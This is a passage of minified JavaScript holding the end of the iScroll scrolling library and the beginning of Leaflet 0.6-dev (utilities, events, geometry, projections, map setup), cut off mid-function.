that._resetPos(200);if(that.options.onTouchEnd)that.options.onTouchEnd.call(that,e);},_resetPos:function(time){var that=this,resetX=that.x>=0?0:that.x<that.maxScrollX?that.maxScrollX:that.x,resetY=that.y>=that.minScrollY||that.maxScrollY>0?that.minScrollY:that.y<that.maxScrollY?that.maxScrollY:that.y;if(resetX==that.x&&resetY==that.y){if(that.moved){that.moved=false;if(that.options.onScrollEnd)that.options.onScrollEnd.call(that);}
if(that.hScrollbar&&that.options.hideScrollbar){if(vendor=='webkit')that.hScrollbarWrapper.style[transitionDelay]='300ms';that.hScrollbarWrapper.style.opacity='0';}
if(that.vScrollbar&&that.options.hideScrollbar){if(vendor=='webkit')that.vScrollbarWrapper.style[transitionDelay]='300ms';that.vScrollbarWrapper.style.opacity='0';}
return;}
that.scrollTo(resetX,resetY,time||0);},_wheel:function(e){var that=this,wheelDeltaX,wheelDeltaY,deltaX,deltaY,deltaScale;if('wheelDeltaX'in e){wheelDeltaX=e.wheelDeltaX/12;wheelDeltaY=e.wheelDeltaY/12;}else if('wheelDelta'in e){wheelDeltaX=wheelDeltaY=e.wheelDelta/12;}else if('detail'in e){wheelDeltaX=wheelDeltaY=-e.detail*3;}else{return;}
if(that.options.wheelAction=='zoom'){deltaScale=that.scale*Math.pow(2,1/3*(wheelDeltaY?wheelDeltaY/Math.abs(wheelDeltaY):0));if(deltaScale<that.options.zoomMin)deltaScale=that.options.zoomMin;if(deltaScale>that.options.zoomMax)deltaScale=that.options.zoomMax;if(deltaScale!=that.scale){if(!that.wheelZoomCount&&that.options.onZoomStart)that.options.onZoomStart.call(that,e);that.wheelZoomCount++;that.zoom(e.pageX,e.pageY,deltaScale,400);setTimeout(function(){that.wheelZoomCount--;if(!that.wheelZoomCount&&that.options.onZoomEnd)that.options.onZoomEnd.call(that,e);},400);}
return;}
deltaX=that.x+wheelDeltaX;deltaY=that.y+wheelDeltaY;if(deltaX>0)deltaX=0;else if(deltaX<that.maxScrollX)deltaX=that.maxScrollX;if(deltaY>that.minScrollY)deltaY=that.minScrollY;else if(deltaY<that.maxScrollY)deltaY=that.maxScrollY;if(that.maxScrollY<0){that.scrollTo(deltaX,deltaY,0);}},_transitionEnd:function(e){var that=this;if(e.target!=that.scroller)return;that._unbind(TRNEND_EV);that._startAni();},_startAni:function(){var that=this,startX=that.x,startY=that.y,startTime=Date.now(),step,easeOut,animate;if(that.animating)return;if(!that.steps.length){that._resetPos(400);return;}
step=that.steps.shift();if(step.x==startX&&step.y==startY)step.time=0;that.animating=true;that.moved=true;if(that.options.useTransition){that._transitionTime(step.time);that._pos(step.x,step.y);that.animating=false;if(step.time)that._bind(TRNEND_EV);else that._resetPos(0);return;}
animate=function(){var now=Date.now(),newX,newY;if(now>=startTime+step.time){that._pos(step.x,step.y);that.animating=false;if(that.options.onAnimationEnd)that.options.onAnimationEnd.call(that);that._startAni();return;}
now=(now-startTime)/step.time-1;easeOut=m.sqrt(1-now*now);newX=(step.x-startX)*easeOut+startX;newY=(step.y-startY)*easeOut+startY;that._pos(newX,newY);if(that.animating)that.aniTime=nextFrame(animate);};animate();},_transitionTime:function(time){time+='ms';this.scroller.style[transitionDuration]=time;if(this.hScrollbar)this.hScrollbarIndicator.style[transitionDuration]=time;if(this.vScrollbar)this.vScrollbarIndicator.style[transitionDuration]=time;},_momentum:function(dist,time,maxDistUpper,maxDistLower,size){var deceleration=0.0006,speed=m.abs(dist)/time,newDist=(speed*speed)/(2*deceleration),newTime=0,outsideDist=0;if(dist>0&&newDist>maxDistUpper){outsideDist=size/(6/(newDist/speed*deceleration));maxDistUpper=maxDistUpper+outsideDist;speed=speed*maxDistUpper/newDist;newDist=maxDistUpper;}else if(dist<0&&newDist>maxDistLower){outsideDist=size/(6/(newDist/speed*deceleration));maxDistLower=maxDistLower+outsideDist;speed=speed*maxDistLower/newDist;newDist=maxDistLower;}
newDist=newDist*(dist<0?-1:1);newTime=speed/deceleration;return{dist:newDist,time:m.round(newTime)};},_offset:function(el){var left=-el.offsetLeft,top=-el.offsetTop;while(el=el.offsetParent){left-=el.offsetLeft;top-=el.offsetTop;}
if(el!=this.wrapper){left*=this.scale;top*=this.scale;}
return{left:left,top:top};},_snap:function(x,y){var that=this,i,l,page,time,sizeX,sizeY;page=that.pagesX.length-1;for(i=0,l=that.pagesX.length;i<l;i++){if(x>=that.pagesX[i]){page=i;break;}}
if(page==that.currPageX&&page>0&&that.dirX<0)page--;x=that.pagesX[page];sizeX=m.abs(x-that.pagesX[that.currPageX]);sizeX=sizeX?m.abs(that.x-x)/sizeX*500:0;that.currPageX=page;page=that.pagesY.length-1;for(i=0;i<page;i++){if(y>=that.pagesY[i]){page=i;break;}}
if(page==that.currPageY&&page>0&&that.dirY<0)page--;y=that.pagesY[page];sizeY=m.abs(y-that.pagesY[that.currPageY]);sizeY=sizeY?m.abs(that.y-y)/sizeY*500:0;that.currPageY=page;time=m.round(m.max(sizeX,sizeY))||200;return{x:x,y:y,time:time};},_bind:function(type,el,bubble){(el||this.scroller).addEventListener(type,this,!!bubble);},_unbind:function(type,el,bubble){(el||this.scroller).removeEventListener(type,this,!!bubble);},destroy:function(){var that=this;that.scroller.style[transform]='';that.hScrollbar=false;that.vScrollbar=false;that._scrollbar('h');that._scrollbar('v');that._unbind(RESIZE_EV,window);that._unbind(START_EV);that._unbind(MOVE_EV,window);that._unbind(END_EV,window);that._unbind(CANCEL_EV,window);if(!that.options.hasTouch){that._unbind('DOMMouseScroll');that._unbind('mousewheel');}
if(that.options.useTransition)that._unbind(TRNEND_EV);if(that.options.checkDOMChanges)clearInterval(that.checkDOMTime);if(that.options.onDestroy)that.options.onDestroy.call(that);},refresh:function(){var that=this,offset,i,l,els,pos=0,page=0;if(that.scale<that.options.zoomMin)that.scale=that.options.zoomMin;that.wrapperW=that.wrapper.clientWidth||1;that.wrapperH=that.wrapper.clientHeight||1;that.minScrollY=-that.options.topOffset||0;that.scrollerW=m.round(that.scroller.offsetWidth*that.scale);that.scrollerH=m.round((that.scroller.offsetHeight+that.minScrollY)*that.scale);that.maxScrollX=that.wrapperW-that.scrollerW;that.maxScrollY=that.wrapperH-that.scrollerH+that.minScrollY;that.dirX=0;that.dirY=0;if(that.options.onRefresh)that.options.onRefresh.call(that);that.hScroll=that.options.hScroll&&that.maxScrollX<0;that.vScroll=that.options.vScroll&&(!that.options.bounceLock&&!that.hScroll||that.scrollerH>that.wrapperH);that.hScrollbar=that.hScroll&&that.options.hScrollbar;that.vScrollbar=that.vScroll&&that.options.vScrollbar&&that.scrollerH>that.wrapperH;offset=that._offset(that.wrapper);that.wrapperOffsetLeft=-offset.left;that.wrapperOffsetTop=-offset.top;if(typeof that.options.snap=='string'){that.pagesX=[];that.pagesY=[];els=that.scroller.querySelectorAll(that.options.snap);for(i=0,l=els.length;i<l;i++){pos=that._offset(els[i]);pos.left+=that.wrapperOffsetLeft;pos.top+=that.wrapperOffsetTop;that.pagesX[i]=pos.left<that.maxScrollX?that.maxScrollX:pos.left*that.scale;that.pagesY[i]=pos.top<that.maxScrollY?that.maxScrollY:pos.top*that.scale;}}else if(that.options.snap){that.pagesX=[];while(pos>=that.maxScrollX){that.pagesX[page]=pos;pos=pos-that.wrapperW;page++;}
if(that.maxScrollX%that.wrapperW)that.pagesX[that.pagesX.length]=that.maxScrollX-that.pagesX[that.pagesX.length-1]+that.pagesX[that.pagesX.length-1];pos=0;page=0;that.pagesY=[];while(pos>=that.maxScrollY){that.pagesY[page]=pos;pos=pos-that.wrapperH;page++;}
if(that.maxScrollY%that.wrapperH)that.pagesY[that.pagesY.length]=that.maxScrollY-that.pagesY[that.pagesY.length-1]+that.pagesY[that.pagesY.length-1];}
that._scrollbar('h');that._scrollbar('v');if(!that.zoomed){that.scroller.style[transitionDuration]='0';that._resetPos(400);}},scrollTo:function(x,y,time,relative){var that=this,step=x,i,l;that.stop();if(!step.length)step=[{x:x,y:y,time:time,relative:relative}];for(i=0,l=step.length;i<l;i++){if(step[i].relative){step[i].x=that.x-step[i].x;step[i].y=that.y-step[i].y;}
that.steps.push({x:step[i].x,y:step[i].y,time:step[i].time||0});}
that._startAni();},scrollToElement:function(el,time){var that=this,pos;el=el.nodeType?el:that.scroller.querySelector(el);if(!el)return;pos=that._offset(el);pos.left+=that.wrapperOffsetLeft;pos.top+=that.wrapperOffsetTop;pos.left=pos.left>0?0:pos.left<that.maxScrollX?that.maxScrollX:pos.left;pos.top=pos.top>that.minScrollY?that.minScrollY:pos.top<that.maxScrollY?that.maxScrollY:pos.top;time=time===undefined?m.max(m.abs(pos.left)*2,m.abs(pos.top)*2):time;that.scrollTo(pos.left,pos.top,time);},scrollToPage:function(pageX,pageY,time){var that=this,x,y;time=time===undefined?400:time;if(that.options.onScrollStart)that.options.onScrollStart.call(that);if(that.options.snap){pageX=pageX=='next'?that.currPageX+1:pageX=='prev'?that.currPageX-1:pageX;pageY=pageY=='next'?that.currPageY+1:pageY=='prev'?that.currPageY-1:pageY;pageX=pageX<0?0:pageX>that.pagesX.length-1?that.pagesX.length-1:pageX;pageY=pageY<0?0:pageY>that.pagesY.length-1?that.pagesY.length-1:pageY;that.currPageX=pageX;that.currPageY=pageY;x=that.pagesX[pageX];y=that.pagesY[pageY];}else{x=-that.wrapperW*pageX;y=-that.wrapperH*pageY;if(x<that.maxScrollX)x=that.maxScrollX;if(y<that.maxScrollY)y=that.maxScrollY;}
that.scrollTo(x,y,time);},disable:function(){this.stop();this._resetPos(0);this.enabled=false;this._unbind(MOVE_EV,window);this._unbind(END_EV,window);this._unbind(CANCEL_EV,window);},enable:function(){this.enabled=true;},stop:function(){if(this.options.useTransition)this._unbind(TRNEND_EV);else cancelFrame(this.aniTime);this.steps=[];this.moved=false;this.animating=false;},zoom:function(x,y,scale,time){var that=this,relScale=scale/that.scale;if(!that.options.useTransform)return;that.zoomed=true;time=time===undefined?200:time;x=x-that.wrapperOffsetLeft-that.x;y=y-that.wrapperOffsetTop-that.y;that.x=x-x*relScale+that.x;that.y=y-y*relScale+that.y;that.scale=scale;that.refresh();that.x=that.x>0?0:that.x<that.maxScrollX?that.maxScrollX:that.x;that.y=that.y>that.minScrollY?that.minScrollY:that.y<that.maxScrollY?that.maxScrollY:that.y;that.scroller.style[transitionDuration]=time+'ms';that.scroller.style[transform]='translate('+that.x+'px,'+that.y+'px) scale('+scale+')'+translateZ;that.zoomed=false;},isReady:function(){return!this.moved&&!this.zoomed&&!this.animating;}};function prefixStyle(style){if(vendor==='')return style;style=style.charAt(0).toUpperCase()+style.substr(1);return vendor+style;}
dummyStyle=null;if(typeof exports!=='undefined')exports.iScroll=iScroll;else window.iScroll=iScroll;})(window,document);
// leafletjs/latest/leaflet.js

(function(t,e,i){var n,o;typeof exports!=i+""?n=exports:(o=t.L,n={},n.noConflict=function(){return t.L=o,this},t.L=n),n.version="0.6-dev",n.Util={extend:function(t){var e,i,n,o,s=Array.prototype.slice.call(arguments,1);for(i=0,n=s.length;n>i;i++){o=s[i]||{};for(e in o)o.hasOwnProperty(e)&&(t[e]=o[e])}return t},bind:function(t,e){var i=arguments.length>2?Array.prototype.slice.call(arguments,2):null;return function(){return t.apply(e,i||arguments)}},stamp:function(){var t=0,e="_leaflet_id";return function(i){return i[e]=i[e]||++t,i[e]}}(),limitExecByInterval:function(t,e,n){var o,s;return function a(){var r=arguments;return o?(s=!0,i):(o=!0,setTimeout(function(){o=!1,s&&(a.apply(n,r),s=!1)},e),t.apply(n,r),i)}},falseFn:function(){return!1},formatNum:function(t,e){var i=Math.pow(10,e||5);return Math.round(t*i)/i},splitWords:function(t){return t.replace(/^\s+|\s+$/g,"").split(/\s+/)},setOptions:function(t,e){return t.options=n.extend({},t.options,e),t.options},getParamString:function(t,e){var i=[];for(var n in t)t.hasOwnProperty(n)&&i.push(encodeURIComponent(n)+"="+encodeURIComponent(t[n]));return(e&&-1!==e.indexOf("?")?"&":"?")+i.join("&")},template:function(t,e){return t.replace(/\{ *([\w_]+) *\}/g,function(t,i){var n=e[i];if(!e.hasOwnProperty(i))throw Error("No value provided for variable "+t);return"function"==typeof n&&(n=n(e)),n})},isArray:function(t){return"[object Array]"===Object.prototype.toString.call(t)},emptyImageUrl:"data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs="},function(){function e(e){var i,n,o=["webkit","moz","o","ms"];for(i=0;o.length>i&&!n;i++)n=t[o[i]+e];return n}function o(e){var i=+new Date,n=Math.max(0,16-(i-s));return s=i+n,t.setTimeout(e,n)}var s=0,a=t.requestAnimationFrame||e("RequestAnimationFrame")||o,r=t.cancelAnimationFrame||e("CancelAnimationFrame")||e("CancelRequestAnimationFrame")||function(e){t.clearTimeout(e)};n.Util.requestAnimFrame=function(e,s,r,h){return e=n.bind(e,s),r&&a===o?(e(),i):a.call(t,e,h)},n.Util.cancelAnimFrame=function(e){e&&r.call(t,e)}}(),n.extend=n.Util.extend,n.bind=n.Util.bind,n.stamp=n.Util.stamp,n.setOptions=n.Util.setOptions,n.Class=function(){},n.Class.extend=function(t){var e=function(){this.initialize&&this.initialize.apply(this,arguments),this._initHooks&&this.callInitHooks()},i=function(){};i.prototype=this.prototype;var o=new i;o.constructor=e,e.prototype=o;for(var s in this)this.hasOwnProperty(s)&&"prototype"!==s&&(e[s]=this[s]);t.statics&&(n.extend(e,t.statics),delete t.statics),t.includes&&(n.Util.extend.apply(null,[o].concat(t.includes)),delete t.includes),t.options&&o.options&&(t.options=n.extend({},o.options,t.options)),n.extend(o,t),o._initHooks=[];var a=this;return e.__super__=a.prototype,o.callInitHooks=function(){if(!this._initHooksCalled){a.prototype.callInitHooks&&a.prototype.callInitHooks.call(this),this._initHooksCalled=!0;for(var t=0,e=o._initHooks.length;e>t;t++)o._initHooks[t].call(this)}},e},n.Class.include=function(t){n.extend(this.prototype,t)},n.Class.mergeOptions=function(t){n.extend(this.prototype.options,t)},n.Class.addInitHook=function(t){var e=Array.prototype.slice.call(arguments,1),i="function"==typeof t?t:function(){this[t].apply(this,e)};this.prototype._initHooks=this.prototype._initHooks||[],this.prototype._initHooks.push(i)};var s="_leaflet_events";n.Mixin={},n.Mixin.Events={addEventListener:function(t,e,i){var o,a,r,h,l,u,c,_=this[s]=this[s]||{},p=i&&n.stamp(i);if("object"==typeof t){for(o in t)t.hasOwnProperty(o)&&this.addEventListener(o,t[o],e);return this}for(t=n.Util.splitWords(t),a=0,r=t.length;r>a;a++)h={action:e,context:i||this},p?(l=t[a]+"_idx",u=l+"_len",c=_[l]=_[l]||{},c[p]?c[p].push(h):(c[p]=[h],_[u]=(_[u]||0)+1)):(_[t[a]]=_[t[a]]||[],_[t[a]].push(h));return this},hasEventListeners:function(t){return s in this&&(t in this[s]&&this[s][t].length>0||this[s][t+"_idx_len"]>0)},removeEventListener:function(t,e,i){var o,a,r,h,l,u,c,_=this[s],p=i&&n.stamp(i);if("object"==typeof t){for(o in t)t.hasOwnProperty(o)&&this.removeEventListener(o,t[o],e);return this}for(t=n.Util.splitWords(t),a=0,r=t.length;r>a;a++)if(this.hasEventListeners(t[a])){for(u=t[a]+"_idx",h=p&&_[u]?_[u][p]||[]:_[t[a]]||[],l=h.length-1;l>=0;l--)e&&h[l].action!==e||i&&h[l].context!==i||h.splice(l,1);p&&0===h.length&&_[u]&&_[u][p]&&(c=u+"_len",delete _[u][p],_[c]=(_[c]||1)-1)}return this},fireEvent:function(t,e){if(!this.hasEventListeners(t))return this;var i,o,a,r,h,l=n.Util.extend({},e,{type:t,target:this});if(this[s][t])for(i=this[s][t].slice(),o=0,a=i.length;a>o;o++)i[o].action.call(i[o].context||this,l);if(r=this[s][t+"_idx"])for(h in r)if(r.hasOwnProperty(h)&&(i=r[h]))for(o=0,a=i.length;a>o;o++)i[o].action.call(i[o].context||this,l);return this}},n.Mixin.Events.on=n.Mixin.Events.addEventListener,n.Mixin.Events.off=n.Mixin.Events.removeEventListener,n.Mixin.Events.fire=n.Mixin.Events.fireEvent,function(){var o=!!t.ActiveXObject,s=o&&!t.XMLHttpRequest,a=o&&!e.querySelector,r=o&&!e.addEventListener,h=navigator.userAgent.toLowerCase(),l=-1!==h.indexOf("webkit"),u=-1!==h.indexOf("chrome"),c=-1!==h.indexOf("phantom"),_=-1!==h.indexOf("android"),p=-1!==h.search("android [23]"),d=typeof orientation!=i+"",m=t.navigator&&t.navigator.msPointerEnabled&&t.navigator.msMaxTouchPoints,f="devicePixelRatio"in t&&t.devicePixelRatio>1||"matchMedia"in t&&t.matchMedia("(min-resolution:144dpi)")&&t.matchMedia("(min-resolution:144dpi)").matches,g=e.documentElement,v=o&&"transition"in g.style,y="WebKitCSSMatrix"in t&&"m11"in new t.WebKitCSSMatrix,P="MozPerspective"in g.style,L="OTransition"in g.style,w=!t.L_DISABLE_3D&&(v||y||P||L)&&!c,x=!t.L_NO_TOUCH&&!c&&function(){var t="ontouchstart";if(m||t in g)return!0;var i=e.createElement("div"),n=!1;return i.setAttribute?(i.setAttribute(t,"return;"),"function"==typeof i[t]&&(n=!0),i.removeAttribute(t),i=null,n):!1}();n.Browser={ie:o,ie6:s,ie7:a,ielt9:r,webkit:l,android:_,android23:p,chrome:u,ie3d:v,webkit3d:y,gecko3d:P,opera3d:L,any3d:w,mobile:d,mobileWebkit:d&&l,mobileWebkit3d:d&&y,mobileOpera:d&&t.opera,touch:x,msTouch:m,retina:f}}(),n.Point=function(t,e,i){this.x=i?Math.round(t):t,this.y=i?Math.round(e):e},n.Point.prototype={clone:function(){return new n.Point(this.x,this.y)},add:function(t){return this.clone()._add(n.point(t))},_add:function(t){return this.x+=t.x,this.y+=t.y,this},subtract:function(t){return this.clone()._subtract(n.point(t))},_subtract:function(t){return this.x-=t.x,this.y-=t.y,this},divideBy:function(t){return this.clone()._divideBy(t)},_divideBy:function(t){return this.x/=t,this.y/=t,this},multiplyBy:function(t){return this.clone()._multiplyBy(t)},_multiplyBy:function(t){return this.x*=t,this.y*=t,this},round:function(){return this.clone()._round()},_round:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this},floor:function(){return this.clone()._floor()},_floor:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this},distanceTo:function(t){t=n.point(t);var e=t.x-this.x,i=t.y-this.y;return Math.sqrt(e*e+i*i)},equals:function(t){return t.x===this.x&&t.y===this.y},contains:function(t){return Math.abs(t.x)<=Math.abs(this.x)&&Math.abs(t.y)<=Math.abs(this.y)},toString:function(){return"Point("+n.Util.formatNum(this.x)+", "+n.Util.formatNum(this.y)+")"}},n.point=function(t,e,o){return t instanceof n.Point?t:n.Util.isArray(t)?new n.Point(t[0],t[1]):t===i||null===t?t:new n.Point(t,e,o)},n.Bounds=function(t,e){if(t)for(var i=e?[t,e]:t,n=0,o=i.length;o>n;n++)this.extend(i[n])},n.Bounds.prototype={extend:function(t){return t=n.point(t),this.min||this.max?(this.min.x=Math.min(t.x,this.min.x),this.max.x=Math.max(t.x,this.max.x),this.min.y=Math.min(t.y,this.min.y),this.max.y=Math.max(t.y,this.max.y)):(this.min=t.clone(),this.max=t.clone()),this},getCenter:function(t){return new n.Point((this.min.x+this.max.x)/2,(this.min.y+this.max.y)/2,t)},getBottomLeft:function(){return new n.Point(this.min.x,this.max.y)},getTopRight:function(){return new n.Point(this.max.x,this.min.y)},getSize:function(){return this.max.subtract(this.min)},contains:function(t){var e,i;return t="number"==typeof t[0]||t instanceof n.Point?n.point(t):n.bounds(t),t instanceof n.Bounds?(e=t.min,i=t.max):e=i=t,e.x>=this.min.x&&i.x<=this.max.x&&e.y>=this.min.y&&i.y<=this.max.y},intersects:function(t){t=n.bounds(t);var e=this.min,i=this.max,o=t.min,s=t.max,a=s.x>=e.x&&o.x<=i.x,r=s.y>=e.y&&o.y<=i.y;return a&&r},isValid:function(){return!(!this.min||!this.max)}},n.bounds=function(t,e){return!t||t instanceof n.Bounds?t:new n.Bounds(t,e)},n.Transformation=function(t,e,i,n){this._a=t,this._b=e,this._c=i,this._d=n},n.Transformation.prototype={transform:function(t,e){return this._transform(t.clone(),e)},_transform:function(t,e){return e=e||1,t.x=e*(this._a*t.x+this._b),t.y=e*(this._c*t.y+this._d),t},untransform:function(t,e){return e=e||1,new n.Point((t.x/e-this._b)/this._a,(t.y/e-this._d)/this._c)}},n.DomUtil={get:function(t){return"string"==typeof t?e.getElementById(t):t},getStyle:function(t,i){var n=t.style[i];if(!n&&t.currentStyle&&(n=t.currentStyle[i]),(!n||"auto"===n)&&e.defaultView){var o=e.defaultView.getComputedStyle(t,null);n=o?o[i]:null}return"auto"===n?null:n},getViewportOffset:function(t){var i,o=0,s=0,a=t,r=e.body,h=e.documentElement,l=n.Browser.ie7;do{if(o+=a.offsetTop||0,s+=a.offsetLeft||0,o+=parseInt(n.DomUtil.getStyle(a,"borderTopWidth"),10)||0,s+=parseInt(n.DomUtil.getStyle(a,"borderLeftWidth"),10)||0,i=n.DomUtil.getStyle(a,"position"),a.offsetParent===r&&"absolute"===i)break;if("fixed"===i){o+=r.scrollTop||h.scrollTop||0,s+=r.scrollLeft||h.scrollLeft||0;break}a=a.offsetParent}while(a);a=t;do{if(a===r)break;o-=a.scrollTop||0,s-=a.scrollLeft||0,n.DomUtil.documentIsLtr()||!n.Browser.webkit&&!l||(s+=a.scrollWidth-a.clientWidth,l&&"hidden"!==n.DomUtil.getStyle(a,"overflow-y")&&"hidden"!==n.DomUtil.getStyle(a,"overflow")&&(s+=17)),a=a.parentNode}while(a);return new n.Point(s,o)},documentIsLtr:function(){return n.DomUtil._docIsLtrCached||(n.DomUtil._docIsLtrCached=!0,n.DomUtil._docIsLtr="ltr"===n.DomUtil.getStyle(e.body,"direction")),n.DomUtil._docIsLtr},create:function(t,i,n){var o=e.createElement(t);return o.className=i,n&&n.appendChild(o),o},disableTextSelection:function(){e.selection&&e.selection.empty&&e.selection.empty(),this._onselectstart||(this._onselectstart=e.onselectstart||null,e.onselectstart=n.Util.falseFn)},enableTextSelection:function(){e.onselectstart===n.Util.falseFn&&(e.onselectstart=this._onselectstart,this._onselectstart=null)},hasClass:function(t,e){return t.className.length>0&&RegExp("(^|\\s)"+e+"(\\s|$)").test(t.className)},addClass:function(t,e){n.DomUtil.hasClass(t,e)||(t.className+=(t.className?" ":"")+e)},removeClass:function(t,e){function i(t,i){return i===e?"":t}t.className=t.className.replace(/(\S+)\s*/g,i).replace(/(^\s+|\s+$)/,"")},setOpacity:function(t,e){if("opacity"in t.style)t.style.opacity=e;else if("filter"in t.style){var i=!1,n="DXImageTransform.Microsoft.Alpha";try{i=t.filters.item(n)}catch(o){if(1===e)return}e=Math.round(100*e),i?(i.Enabled=100!==e,i.Opacity=e):t.style.filter+=" progid:"+n+"(opacity="+e+")"}},testProp:function(t){for(var i=e.documentElement.style,n=0;t.length>n;n++)if(t[n]in i)return t[n];return!1},getTranslateString:function(t){var e=n.Browser.webkit3d,i="translate"+(e?"3d":"")+"(",o=(e?",0":"")+")";return i+t.x+"px,"+t.y+"px"+o},getScaleString:function(t,e){var i=n.DomUtil.getTranslateString(e.add(e.multiplyBy(-1*t))),o=" scale("+t+") ";return i+o},setPosition:function(t,e,i){t._leaflet_pos=e,!i&&n.Browser.any3d?(t.style[n.DomUtil.TRANSFORM]=n.DomUtil.getTranslateString(e),n.Browser.mobileWebkit3d&&(t.style.WebkitBackfaceVisibility="hidden")):(t.style.left=e.x+"px",t.style.top=e.y+"px")},getPosition:function(t){return t._leaflet_pos}},n.DomUtil.TRANSFORM=n.DomUtil.testProp(["transform","WebkitTransform","OTransform","MozTransform","msTransform"]),n.DomUtil.TRANSITION=n.DomUtil.testProp(["webkitTransition","transition","OTransition","MozTransition","msTransition"]),n.DomUtil.TRANSITION_END="webkitTransition"===n.DomUtil.TRANSITION||"OTransition"===n.DomUtil.TRANSITION?n.DomUtil.TRANSITION+"End":"transitionend",n.LatLng=function(t,e){var i=parseFloat(t),n=parseFloat(e);if(isNaN(i)||isNaN(n))throw Error("Invalid LatLng object: ("+t+", "+e+")");this.lat=i,this.lng=n},n.extend(n.LatLng,{DEG_TO_RAD:Math.PI/180,RAD_TO_DEG:180/Math.PI,MAX_MARGIN:1e-9}),n.LatLng.prototype={equals:function(t){if(!t)return!1;t=n.latLng(t);var e=Math.max(Math.abs(this.lat-t.lat),Math.abs(this.lng-t.lng));return n.LatLng.MAX_MARGIN>=e},toString:function(t){return"LatLng("+n.Util.formatNum(this.lat,t)+", "+n.Util.formatNum(this.lng,t)+")"},distanceTo:function(t){t=n.latLng(t);var e=6378137,i=n.LatLng.DEG_TO_RAD,o=(t.lat-this.lat)*i,s=(t.lng-this.lng)*i,a=this.lat*i,r=t.lat*i,h=Math.sin(o/2),l=Math.sin(s/2),u=h*h+l*l*Math.cos(a)*Math.cos(r);return 2*e*Math.atan2(Math.sqrt(u),Math.sqrt(1-u))},wrap:function(t,e){var i=this.lng;return t=t||-180,e=e||180,i=(i+e)%(e-t)+(t>i||i===e?e:t),new n.LatLng(this.lat,i)}},n.latLng=function(t,e){return t instanceof n.LatLng?t:n.Util.isArray(t)?new n.LatLng(t[0],t[1]):t===i||null===t?t:"object"==typeof t&&"lat"in t?new n.LatLng(t.lat,"lng"in t?t.lng:t.lon):new n.LatLng(t,e)},n.LatLngBounds=function(t,e){if(t)for(var i=e?[t,e]:t,n=0,o=i.length;o>n;n++)this.extend(i[n])},n.LatLngBounds.prototype={extend:function(t){return t="number"==typeof t[0]||"string"==typeof t[0]||t instanceof n.LatLng?n.latLng(t):n.latLngBounds(t),t instanceof n.LatLng?this._southWest||this._northEast?(this._southWest.lat=Math.min(t.lat,this._southWest.lat),this._southWest.lng=Math.min(t.lng,this._southWest.lng),this._northEast.lat=Math.max(t.lat,this._northEast.lat),this._northEast.lng=Math.max(t.lng,this._northEast.lng)):(this._southWest=new n.LatLng(t.lat,t.lng),this._northEast=new n.LatLng(t.lat,t.lng)):t instanceof n.LatLngBounds&&(this.extend(t._southWest),this.extend(t._northEast)),this},pad:function(t){var e=this._southWest,i=this._northEast,o=Math.abs(e.lat-i.lat)*t,s=Math.abs(e.lng-i.lng)*t;return new n.LatLngBounds(new n.LatLng(e.lat-o,e.lng-s),new n.LatLng(i.lat+o,i.lng+s))},getCenter:function(){return new n.LatLng((this._southWest.lat+this._northEast.lat)/2,(this._southWest.lng+this._northEast.lng)/2)},getSouthWest:function(){return this._southWest},getNorthEast:function(){return this._northEast},getNorthWest:function(){return new n.LatLng(this.getNorth(),this.getWest())},getSouthEast:function(){return new n.LatLng(this.getSouth(),this.getEast())},getWest:function(){return this._southWest.lng},getSouth:function(){return this._southWest.lat},getEast:function(){return this._northEast.lng},getNorth:function(){return this._northEast.lat},contains:function(t){t="number"==typeof t[0]||t instanceof n.LatLng?n.latLng(t):n.latLngBounds(t);var e,i,o=this._southWest,s=this._northEast;return t instanceof n.LatLngBounds?(e=t.getSouthWest(),i=t.getNorthEast()):e=i=t,e.lat>=o.lat&&i.lat<=s.lat&&e.lng>=o.lng&&i.lng<=s.lng},intersects:function(t){t=n.latLngBounds(t);var e=this._southWest,i=this._northEast,o=t.getSouthWest(),s=t.getNorthEast(),a=s.lat>=e.lat&&o.lat<=i.lat,r=s.lng>=e.lng&&o.lng<=i.lng;return a&&r},toBBoxString:function(){return[this.getWest(),this.getSouth(),this.getEast(),this.getNorth()].join(",")},equals:function(t){return t?(t=n.latLngBounds(t),this._southWest.equals(t.getSouthWest())&&this._northEast.equals(t.getNorthEast())):!1},isValid:function(){return!(!this._southWest||!this._northEast)}},n.latLngBounds=function(t,e){return!t||t instanceof n.LatLngBounds?t:new n.LatLngBounds(t,e)},n.Projection={},n.Projection.SphericalMercator={MAX_LATITUDE:85.0511287798,project:function(t){var e=n.LatLng.DEG_TO_RAD,i=this.MAX_LATITUDE,o=Math.max(Math.min(i,t.lat),-i),s=t.lng*e,a=o*e;return a=Math.log(Math.tan(Math.PI/4+a/2)),new n.Point(s,a)},unproject:function(t){var e=n.LatLng.RAD_TO_DEG,i=t.x*e,o=(2*Math.atan(Math.exp(t.y))-Math.PI/2)*e;return new n.LatLng(o,i)}},n.Projection.LonLat={project:function(t){return new n.Point(t.lng,t.lat)},unproject:function(t){return new n.LatLng(t.y,t.x)}},n.CRS={latLngToPoint:function(t,e){var i=this.projection.project(t),n=this.scale(e);return this.transformation._transform(i,n)},pointToLatLng:function(t,e){var i=this.scale(e),n=this.transformation.untransform(t,i);return this.projection.unproject(n)},project:function(t){return this.projection.project(t)},scale:function(t){return 256*Math.pow(2,t)}},n.CRS.Simple=n.extend({},n.CRS,{projection:n.Projection.LonLat,transformation:new n.Transformation(1,0,-1,0),scale:function(t){return Math.pow(2,t)}}),n.CRS.EPSG3857=n.extend({},n.CRS,{code:"EPSG:3857",projection:n.Projection.SphericalMercator,transformation:new n.Transformation(.5/Math.PI,.5,-.5/Math.PI,.5),project:function(t){var e=this.projection.project(t),i=6378137;return e.multiplyBy(i)}}),n.CRS.EPSG900913=n.extend({},n.CRS.EPSG3857,{code:"EPSG:900913"}),n.CRS.EPSG4326=n.extend({},n.CRS,{code:"EPSG:4326",projection:n.Projection.LonLat,transformation:new n.Transformation(1/360,.5,-1/360,.5)}),n.Map=n.Class.extend({includes:n.Mixin.Events,options:{crs:n.CRS.EPSG3857,fadeAnimation:n.DomUtil.TRANSITION&&!n.Browser.android23,trackResize:!0,markerZoomAnimation:n.DomUtil.TRANSITION&&n.Browser.any3d},initialize:function(t,e){e=n.setOptions(this,e),this._initContainer(t),this._initLayout(),this.callInitHooks(),this._initEvents(),e.maxBounds&&this.setMaxBounds(e.maxBounds),e.center&&e.zoom!==i&&this.setView(n.latLng(e.center),e.zoom,!0),this._initLayers(e.layers)},setView:function(t,e){return 